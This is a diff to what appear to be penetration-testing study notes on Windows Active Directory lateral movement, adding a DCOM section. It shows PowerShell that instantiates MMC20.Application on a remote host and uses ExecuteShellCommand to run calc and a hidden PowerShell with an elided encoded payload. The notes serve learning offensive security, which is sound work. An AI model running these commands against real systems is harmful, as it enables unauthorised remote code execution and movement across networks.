@@ -704,6 +704,21 @@ klist
 dir \\web04\admin$
 # Now we can access any shares as jen user as a dave Identity !!
 ```
+## DCOM
+
+Suppose we are in CLIENT74[Compromized] machine as a local admin we can make use of this DCOM and get the Shell from files04 if possible!!
+
+We are going to demonstrate this lateral movement attack as the jen user logged in from the already compromised Windows 11 CLIENT74 host.
+
+From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
+
+```javascript
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73[files04]"))
+
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e J...<encoded payload>","7")
+```
 
 ## Golden Ticket !!
 
